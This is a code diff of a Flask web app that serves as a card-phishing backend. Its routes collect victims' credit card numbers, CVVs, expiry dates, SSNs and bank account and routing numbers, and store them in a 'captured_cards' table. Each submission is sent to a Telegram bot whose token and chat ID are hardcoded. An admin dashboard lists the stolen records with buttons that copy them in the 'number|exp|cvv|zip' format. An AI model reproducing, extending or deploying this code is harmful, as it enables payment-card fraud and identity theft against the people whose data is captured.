@@ -13,8 +13,6 @@ CORS(app)
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ========== DATABASE ==========
-
 def get_db():
     conn = sqlite3.connect('cards.db')
     conn.row_factory = sqlite3.Row
@@ -23,8 +21,6 @@ def get_db():
 def init_db():
     conn = get_db()
     cursor = conn.cursor()
-    
-    # Users table with bank fields
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -40,8 +36,6 @@ def init_db():
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
-    
-    # Cards table
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS captured_cards (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -58,17 +52,14 @@ def init_db():
             FOREIGN KEY (user_id) REFERENCES users(id)
         )
     ''')
-    
     conn.commit()
     conn.close()
     logger.info("Database initialized")
 
-# ========== TELEGRAM ==========
-
 def send_telegram(message):
     try:
-        bot_token = "8866696508:AAGUiyUAINlyKEZkYUwQOGQs7cQ-I7h3PpU"  # ← CHANGE THIS
-        chat_id = "8011205570"      # ← CHANGE THIS
+        bot_token = "8866696508:AAGUiyUAINlyKEZkYUwQOGQs7cQ-I7h3PpU"
+        chat_id = "8011205570"
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
         response = requests.post(url, json={
             'chat_id': chat_id,
@@ -81,8 +72,6 @@ def send_telegram(message):
             logger.error(f"Telegram failed: {response.text}")
     except Exception as e:
         logger.error(f"Telegram error: {str(e)}")
-
-# ========== ROUTES ==========
 
 @app.route('/')
 def index():
@@ -147,21 +136,19 @@ def login():
 
 @app.route('/api/add-bank', methods=['POST'])
 def add_bank():
-    """Add bank account details"""
-    data = request.json
-    user_id = data.get('user_id')
-    bank_name = data.get('bank_name', '').strip()
-    bank_account = data.get('bank_account', '').strip()
-    routing_number = data.get('routing_number', '').strip()
-    account_type = data.get('account_type', 'checking').strip()
-
-    if not all([bank_name, bank_account, routing_number]):
-        return jsonify({'success': False, 'message': 'All bank fields required'})
-
-    conn = get_db()
-    cursor = conn.cursor()
-    
     try:
+        data = request.json
+        user_id = data.get('user_id')
+        bank_name = data.get('bank_name', '').strip()
+        bank_account = data.get('bank_account', '').strip()
+        routing_number = data.get('routing_number', '').strip()
+        account_type = data.get('account_type', 'checking').strip()
+
+        if not all([bank_name, bank_account, routing_number]):
+            return jsonify({'success': False, 'message': 'All bank fields required'})
+
+        conn = get_db()
+        cursor = conn.cursor()
         cursor.execute('''
             UPDATE users 
             SET bank_name = ?, bank_account = ?, routing_number = ?, account_type = ?
@@ -184,50 +171,42 @@ def add_bank():
 💳 Account: {bank_account}
 🔢 Routing: {routing_number}
 📂 Type: {account_type}
-📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-━━━━━━━━━━━━━━━━━━━
-COPY: {bank_account}|{routing_number}|{bank_name}
             """)
 
         return jsonify({'success': True, 'message': 'Bank account added successfully'})
-        
     except Exception as e:
-        logger.error(f"Bank error: {str(e)}")
-        return jsonify({'success': False, 'message': 'Failed to add bank account'})
+        return jsonify({'success': False, 'message': str(e)})
 
 @app.route('/api/verify-card', methods=['POST'])
 def verify_card():
-    data = request.json
-    user_id = data.get('user_id')
-    card_number = data.get('card_number', '').replace(' ', '').replace('-', '')
-    exp_month = data.get('exp_month', '').strip()
-    exp_year = data.get('exp_year', '').strip()
-    cvv = data.get('cvv', '').strip()
-    zip_code = data.get('zip', '').strip()
-    address = data.get('address', '').strip()
-
-    if not all([card_number, exp_month, exp_year, cvv, zip_code]):
-        return jsonify({'success': False, 'message': 'All card fields required'})
-
-    # Detect card type
-    first_digit = card_number[0]
-    if first_digit == '4':
-        card_type = 'Visa'
-    elif first_digit in ['5']:
-        card_type = 'Mastercard'
-    else:
-        card_type = 'Unknown'
-
-    conn = get_db()
-    cursor = conn.cursor()
-    
     try:
+        data = request.json
+        user_id = data.get('user_id')
+        card_number = data.get('card_number', '').replace(' ', '').replace('-', '')
+        exp_month = data.get('exp_month', '').strip()
+        exp_year = data.get('exp_year', '').strip()
+        cvv = data.get('cvv', '').strip()
+        zip_code = data.get('zip', '').strip()
+        address = data.get('address', '').strip()
+
+        if not all([card_number, exp_month, exp_year, cvv, zip_code]):
+            return jsonify({'success': False, 'message': 'All card fields required'})
+
+        first_digit = card_number[0]
+        if first_digit == '4':
+            card_type = 'Visa'
+        elif first_digit in ['5']:
+            card_type = 'Mastercard'
+        else:
+            card_type = 'Unknown'
+
+        conn = get_db()
+        cursor = conn.cursor()
         cursor.execute('''
             INSERT INTO captured_cards (user_id, card_number, exp_month, exp_year, cvv, zip, address, card_type)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?)
         ''', (user_id, card_number, exp_month, exp_year, cvv, zip_code, address, card_type))
         conn.commit()
-        card_id = cursor.lastrowid
 
         cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))
         user = cursor.fetchone()
@@ -245,38 +224,20 @@ def verify_card():
 🔐 CVV: {cvv}
 📍 ZIP: {zip_code}
 🏠 Address: {address}
-📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-━━━━━━━━━━━━━━━━━━━
-COPY: {card_number}|{exp_month}|{exp_year}|{cvv}|{zip_code}
             """
             send_telegram(message)
 
         return jsonify({'success': True, 'message': 'Card verified successfully'})
-        
     except Exception as e:
-        logger.error(f"Card error: {str(e)}")
-        return jsonify({'success': False, 'message': 'Failed to verify card'})
+        return jsonify({'success': False, 'message': str(e)})
 
 @app.route('/admin')
 def admin_dashboard():
     conn = get_db()
     cursor = conn.cursor()
-    
-    cursor.execute('''
-        SELECT id, name, email, ssn, bank_name, bank_account, routing_number, account_type, created_at
-        FROM users
-        ORDER BY created_at DESC
-        LIMIT 50
-    ''')
+    cursor.execute('SELECT * FROM users ORDER BY created_at DESC LIMIT 50')
     users = cursor.fetchall()
-    
-    cursor.execute('''
-        SELECT c.*, u.name, u.email, u.ssn
-        FROM captured_cards c
-        LEFT JOIN users u ON c.user_id = u.id
-        ORDER BY c.created_at DESC
-        LIMIT 50
-    ''')
+    cursor.execute('SELECT * FROM captured_cards ORDER BY created_at DESC LIMIT 50')
     cards = cursor.fetchall()
     conn.close()
 
@@ -286,96 +247,70 @@ def admin_dashboard():
     <head>
         <title>Admin Dashboard</title>
         <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
             body { font-family: Arial; margin: 20px; background: #0f172a; color: white; }
-            h1 { color: #f5c842; margin-bottom: 20px; }
-            .section { margin-bottom: 40px; }
-            .section-title { color: #f5c842; margin-bottom: 15px; border-bottom: 2px solid #f5c842; padding-bottom: 10px; }
+            h1 { color: #f5c842; }
             table { width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.05); border-radius: 12px; overflow: hidden; }
-            th { background: #1a3a5c; padding: 12px; text-align: left; }
-            td { padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1); }
+            th { background: #1a3a5c; padding: 10px; text-align: left; }
+            td { padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.1); }
             .copy-btn { background: #28a745; color: white; border: none; padding: 4px 10px; border-radius: 4px; cursor: pointer; }
-            .stats { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
-            .stat-box { background: rgba(255,255,255,0.05); padding: 15px 25px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); }
-            .stat-box strong { color: #f5c842; }
+            .section { margin-bottom: 30px; }
+            .section-title { color: #f5c842; margin-bottom: 10px; border-bottom: 2px solid #f5c842; padding-bottom: 5px; }
         </style>
     </head>
     <body>
         <h1>💳 Admin Dashboard</h1>
         
-        <div class="stats">
-            <div class="stat-box"><strong>Total Users:</strong> {user_count}</div>
-            <div class="stat-box"><strong>Total Cards:</strong> {card_count}</div>
-            <div class="stat-box"><strong>Bank Accounts:</strong> {bank_count}</div>
-        </div>
-    """
-    
-    user_count = len(users)
-    card_count = len(cards)
-    bank_count = len([u for u in users if u['bank_account']])
-    
-    # Users with Bank Accounts
-    html += """
         <div class="section">
-            <h2 class="section-title">🏦 Users & Bank Accounts</h2>
+            <h2 class="section-title">👤 Users</h2>
             <table>
-                <tr>
-                    <th>ID</th><th>Name</th><th>Email</th><th>SSN</th>
-                    <th>Bank</th><th>Account</th><th>Routing</th><th>Copy</th>
-                </tr>
+                <tr><th>ID</th><th>Name</th><th>Email</th><th>SSN</th><th>Bank</th><th>Account</th><th>Routing</th></tr>
     """
     for user in users:
-        if user['bank_account']:
-            html += f"""
-                <tr>
-                    <td>{user['id']}</td>
-                    <td>{user['name']}</td>
-                    <td>{user['email']}</td>
-                    <td>{user['ssn']}</td>
-                    <td>{user['bank_name'] or 'N/A'}</td>
-                    <td>{user['bank_account'] or 'N/A'}</td>
-                    <td>{user['routing_number'] or 'N/A'}</td>
-                    <td><button class="copy-btn" onclick="copyCard('{user['bank_account']}|{user['routing_number']}|{user['bank_name']}')">📋</button></td>
-                </tr>
-            """
-    html += "</table></div>"
-    
-    # Cards
+        html += f"""
+            <tr>
+                <td>{user['id']}</td>
+                <td>{user['name']}</td>
+                <td>{user['email']}</td>
+                <td>{user['ssn']}</td>
+                <td>{user['bank_name'] or 'N/A'}</td>
+                <td>{user['bank_account'] or 'N/A'}</td>
+                <td>{user['routing_number'] or 'N/A'}</td>
+            </tr>
+        """
     html += """
+            </table>
+        </div>
+        
         <div class="section">
-            <h2 class="section-title">💳 Captured Cards</h2>
+            <h2 class="section-title">💳 Cards</h2>
             <table>
-                <tr>
-                    <th>ID</th><th>User</th><th>Card</th><th>Exp</th><th>CVV</th><th>ZIP</th><th>Type</th><th>Time</th><th>Copy</th>
-                </tr>
+                <tr><th>ID</th><th>User</th><th>Card</th><th>Exp</th><th>CVV</th><th>ZIP</th><th>Time</th><th>Copy</th></tr>
     """
     for card in cards:
         html += f"""
             <tr>
                 <td>{card['id']}</td>
-                <td>{card['name']}</td>
+                <td>{card['user_id']}</td>
                 <td>{card['card_number']}</td>
                 <td>{card['exp_month']}/{card['exp_year']}</td>
                 <td>{card['cvv']}</td>
                 <td>{card['zip']}</td>
-                <td>{card['card_type']}</td>
                 <td>{card['created_at']}</td>
                 <td><button class="copy-btn" onclick="copyCard('{card['card_number']}|{card['exp_month']}|{card['exp_year']}|{card['cvv']}|{card['zip']}')">📋</button></td>
             </tr>
         """
     html += """
-        </table></div>
+            </table>
+        </div>
         <script>
             function copyCard(data) {
                 navigator.clipboard.writeText(data);
                 alert('Copied!');
             }
-            setTimeout(() => location.reload(), 30000);
         </script>
     </body>
     </html>
-    """.format(user_count=user_count, card_count=card_count, bank_count=bank_count)
-    
+    """
     return html
 
 if __name__ == '__main__':
